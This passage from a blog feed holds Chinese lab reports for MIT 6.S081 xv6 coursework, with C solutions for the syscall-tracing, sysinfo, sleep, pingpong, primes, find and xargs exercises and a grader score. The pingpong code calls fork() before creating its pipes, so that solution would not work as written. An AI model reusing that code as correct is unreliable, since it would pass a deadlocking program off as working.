p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s: unknown sys call %d\n"</span>,</span><br><span class="line">           p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;tracemask &amp; (<span class="number">1</span> &lt;&lt; num))</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d: syscall %s -&gt; %d\n"</span>, p-&gt;pid, sysname[num], p-&gt;trapframe-&gt;a0);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>不要忘记在 <code>fork</code> 调用中传播这个 mask。另外，用户态系统调用的声明和桩代码比较简单，这里就略去了。</p>
<h3 id="sysinfo">sysinfo</h3>
<p>要求实现一个系统调用，能够返回系统中的可用内存数量以及运行中的进程数量。难点有几处。</p>
<p>首先，如何计算可用内存大小？参考 <code>kernel/kalloc.c</code>，发现有一个名为 <code>kmem</code> 的变量保存了空闲物理页信息。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> {</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">} kmem;</span><br></pre></td></tr></tbody></table></figure>
<p>通过计算这个 <code>freelist</code> 链表的长度，乘以单个页面的大小，即可得到可用内存的大小，代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_memory</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> amount = <span class="number">0</span>;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span> =</span> kmem.freelist;</span><br><span class="line">  <span class="keyword">for</span> (; r; r = r-&gt;next)</span><br><span class="line">  {</span><br><span class="line">    amount += PGSIZE;</span><br><span class="line">  }</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">return</span> amount;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>其次，如何计算运行中的进程数量。参考 <code>kernel/proc.c</code>，发现其声明了一个大小为 64 的 <code>proc</code> 数组，猜测其应该是支持的最大进程数量。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> <span class="title">proc</span>[<span class="title">NPROC</span>];</span> <span class="comment">// 64</span></span><br></pre></td></tr></tbody></table></figure>
<p><code>allocproc</code> 函数印证了这一点，该函数申请一个新的进程，是通过遍历上述数组，找到 <code>p-&gt;state == UNUSED</code> 实现的。因此可以通过遍历数组，统计得到运行中的进程数量，代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// num of processes</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">num_proc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (p = proc; p &lt; &amp;proc[NPROC]; p++)</span><br><span class="line">  {</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;state != UNUSED)</span><br><span class="line">    {</span><br><span class="line">      cnt++;</span><br><span class="line">    }</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> cnt;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>上面两个函数的声明需要加在 <code>kernel/defs.h</code> 中，方便调用。然后，可以在 <code>kernel/sysproc.c</code> 中新建系统调用。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">if</span> (argaddr(<span class="number">0</span>, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line">  info.freemem = free_memory();</span><br><span class="line">  info.nproc = num_proc();</span><br><span class="line">  <span class="keyword">if</span> (copyout(myproc()-&gt;pagetable, addr, (<span class="keyword">char</span> *)&amp;info, <span class="keyword">sizeof</span>(info)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><code>copyout</code> 用于将内核的数据拷贝到用户态，参考 <code>fstat</code> 调用可以了解它的用法。</p>
<p>最后，完成用户态的相关代码即可。</p>
<h2 id="结果">结果</h2>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">== Test trace 32 grep == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">trace 32 grep: OK (4.8s) </span><br><span class="line">== Test trace all grep == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">trace all grep: OK (0.8s) </span><br><span class="line">== Test trace nothing == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">trace nothing: OK (0.8s) </span><br><span class="line">== Test trace children == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">trace children: OK (9.9s) </span><br><span class="line">== Test sysinfotest == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">sysinfotest: OK (1.7s) </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 35/35</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>操作系统</category>
        <category>MIT6.S081</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>实验报告</tag>
        <tag>操作系统</tag>
        <tag>MIT6.S081</tag>
      </tags>
  </entry>
  <entry>
    <title>XV6-Lab-1 实验报告: Xv6 and Unix utilities</title>
    <url>/blog/2023/05/14/XV6-Lab-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT6.S081 的实验课程的 lab1 实验报告。实验内容是在一个类 unix 操作系统 xv6 上实现各种功能。lab1 内容较为简单，主要是通过系统调用实现一些工具程序。</p>
<span id="more"></span>
<h2 id="目录结构">目录结构</h2>
<p>可以看到源代码主要分为两个目录 <code>user/, kernal/</code>，分别对应用户程序和内核程序。在 <code>user/user.h</code> 中，声明了 xv6 支持的系统调用和一些工具函数，工具函数的实现在 <code>user/ulib.c</code> 中。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system calls</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span>)</span> __<span class="title">attribute__</span><span class="params">((noreturn))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span>*)</span></span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ulib.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stat</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*, struct stat*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">strcpy</span><span class="params">(<span class="keyword">char</span>*, <span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memmove</span><span class="params">(<span class="keyword">void</span>*, <span class="keyword">const</span> <span class="keyword">void</span>*, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>此外，<code>user/</code> 目录下也保存了用户态的应用程序，以 <code>echo.c</code> 为例，通过 <code>main</code> 完成命令行传参，使用 <code>write</code> 系统调用完成写入标准输出流，调用 <code>exit</code> 显式结束执行。程序需要加入 <code>makefile</code> 中的 <code>UPROGS</code>，才会被编译加载。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/stat.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; argc; i++){</span><br><span class="line">    write(<span class="number">1</span>, argv[i], <span class="built_in">strlen</span>(argv[i]));</span><br><span class="line">    <span class="keyword">if</span>(i + <span class="number">1</span> &lt; argc){</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">" "</span>, <span class="number">1</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"\n"</span>, <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><code>kernel</code> 目录下，<code>syscall.h, syscall.c</code> 声明了系统调用号及映射关系，系统调用的实现在 <code>sysproc.c, sysfile.c</code> 等文件中。在本次 lab 中只需要编写用户态程序。</p>
<h2 id="exercises">Exercises</h2>
<h2 id="sleep">sleep</h2>
<p>比较简单，调用 <code>sleep</code> 系统调用，实现用户程序，代码如下。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> ticks;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt;= <span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"usage: sleep n(ticks)"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    ticks = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    sleep(ticks);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="pingpong">pingpong</h2>
<p>通过一对管道，实现父子进程的通信。</p>
<h3 id="背景知识">背景知识</h3>
<p>在 linux 下，IO 资源均抽象为文件描述符（file description，fd），本质上就是一个整数，每个进程有一个独立的 fd 映射表，用于把 fd 映射为 IO 资源。标准输入 / 输出 / 异常分别映射到 0,1,2。在增加 IO 资源时，会分配最小可用的 fd。xv6 也使用了这种思想，因此可以通过关闭 fd，重新分配 fd 比较简单地实现 IO 重定向功能。参见实验指导书中的例子</p>
<p>xv6 中的 <code>pipe</code> 调用，用于初始化一对 fd 作为管道，分别用于读写。</p>
<h3 id="解决方法">解决方法</h3>
<p><code>pipe</code> 只能用于单向通信，为达到双向通信，需要创建一对 <code>pipe</code>，并关闭无用的写管道，避免 <code>read</code> 卡死。另外，为了避免交叉输出的混乱，建议在父进程中 <code>wait</code> 子进程结束再输出。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">int</span> parent[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> child[<span class="number">2</span>];</span><br><span class="line">    pipe(parent);</span><br><span class="line">    pipe(child);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// child</span></span><br><span class="line">        close(child[<span class="number">1</span>]);</span><br><span class="line">        read(child[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>, <span class="string">"%d: received ping\n"</span>, getpid());</span><br><span class="line">        write(parent[<span class="number">1</span>], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        close(parent[<span class="number">1</span>]);</span><br><span class="line">        write(child[<span class="number">1</span>], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        read(parent[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 避免交叉输出</span></span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>, <span class="string">"%d: received pong\n"</span>, getpid());</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="primes">primes</h2>
<p>实现一个并行的素数筛。图示如下：</p>
<p><img src="https://swtch.com/~rsc/thread/sieve.gif"></p>
<p>可以看到，其思想是一个流水线一样的操作。每个数从最左侧输入，在每个模块里，通过下面的伪代码，从左侧读入数，判断是否能被当前模块的素数整除，若不能再送到右边的模块。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">p = get a number from left neighbor</span><br><span class="line">print p</span><br><span class="line">loop:</span><br><span class="line">    n = get a number from left neighbor</span><br><span class="line">    if (p does not divide n)</span><br><span class="line">        send n to right neighbor</span><br></pre></td></tr></tbody></table></figure>
<p>需要思考的一个点就是<strong>模块是什么时候创建的</strong>。实验要求我们只能在必要的时候创建模块。思考这个过程可以发现，<strong>如果一个数到达了流水线的边界还没有被筛掉，就意味着它是一个素数，就需要在流水线末尾创建一个模块用于筛去它的倍数</strong>。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"><span class="keyword">int</span> p[<span class="number">40</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">int</span> prime)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">1</span>, <span class="string">"prime %d\n"</span>, prime);</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">while</span> (read(p[idx][<span class="number">0</span>], &amp;num, <span class="number">4</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (num % prime != <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 未初始化</span></span><br><span class="line">            <span class="keyword">if</span> (p[idx + <span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                pipe(p[idx + <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">                {</span><br><span class="line">                    close(p[idx + <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">                    process(idx + <span class="number">1</span>, num);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                {</span><br><span class="line">                    close(p[idx + <span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                write(p[idx + <span class="number">1</span>][<span class="number">1</span>], &amp;num, <span class="number">4</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    close(p[idx][<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (p[idx + <span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">    {</span><br><span class="line">        close(p[idx + <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">    }</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">34</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        nums[i] = i + <span class="number">2</span>;</span><br><span class="line">    }</span><br><span class="line">    pipe(p[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        close(p[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">        process(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        close(p[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        write(p[<span class="number">0</span>][<span class="number">1</span>], nums, <span class="keyword">sizeof</span>(nums));</span><br><span class="line">        close(p[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="find">find</h2>
<p>实现类似 linux <code>find</code> 的功能。也比较简单，需要注意的是当文件夹匹配查找名的时候，就不用递归向下了。从 <code>ls.c</code> 中可以借鉴读取文件类型和遍历文件夹的逻辑。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/stat.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/fs.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, filename) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s%s\n"</span>, buf, path);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">int</span> ori = idx;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *p = buf + idx;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(path);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, path, len + <span class="number">1</span>);</span><br><span class="line">    idx += len;</span><br><span class="line">    <span class="comment">// fprintf(1, "buf: %s, idx = %d, path: %s, filename: %s \n", buf, idx, path, filename);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = open(buf, <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"find: cannot open %s\n"</span>, buf);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fstat(fd, &amp;st) &lt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"find: cannot stat %s\n"</span>, path);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">switch</span> (st.type)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">case</span> T_FILE:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> T_DIR:</span><br><span class="line">        <span class="keyword">if</span> (idx + <span class="number">1</span> + DIRSIZ + <span class="number">1</span> &gt; <span class="keyword">sizeof</span> buf)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"find: path too long\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        buf[idx++] = <span class="string">'/'</span>;</span><br><span class="line">        buf[idx] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">while</span> (read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (de.inum == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="built_in">memcpy</span>(name, de.name, DIRSIZ);</span><br><span class="line">            name[DIRSIZ] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, <span class="string">"."</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(name, <span class="string">".."</span>) == <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            }</span><br><span class="line">            find(name, filename);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    close(fd);</span><br><span class="line">    idx = ori;</span><br><span class="line">    buf[idx] = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"usage: find {path} {filename}"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="xargs">xargs</h2>
<p>实现类似 linux <code>xargs</code> 的功能。从标准输入读取每一行，作为参数加在命令的后面。最简单的做法就是按实验提示，每次读入一个字符，如果是换行就处理这一行，否则继续读。不过每次读一个字符会有很大的 IO 开销，实际应用中肯定是不能这么写的。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/stat.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/fs.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/param.h"</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt;= <span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"usage: xargs commands..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">char</span> *params[MAXARG];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; argc; i++)</span><br><span class="line">    {</span><br><span class="line">        params[i - <span class="number">1</span>] = argv[i];</span><br><span class="line">    }</span><br><span class="line">    params[argc] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (read(<span class="number">0</span>, buf + idx, <span class="number">1</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (buf[idx] != <span class="string">'\n'</span>)</span><br><span class="line">        {</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        buf[idx] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            params[argc - <span class="number">1</span>] = buf;</span><br><span class="line"></span><br><span class="line">            exec(params[<span class="number">0</span>], params);</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"command failed:"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argc + <span class="number">1</span>; i++)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"%s "</span>, params[i]);</span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            wait(<span class="number">0</span>);</span><br><span class="line">            idx = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="参考">参考</h2>
<p>我个人使用的是 2021 年秋季版本。课程官网为 <a href="https://pdos.csail.mit.edu/6.828/2021/schedule.html">6.S081 / Fall 2021 (mit.edu)</a>。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>操作系统</category>
        <category>MIT6.S081</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>实验报告</tag>
        <tag>操作系统</tag>
        <tag>MIT6.S081</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-2 实验报告: bomblab</title>
    <url>/blog/2023/05/04/CSAPP-Lab-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
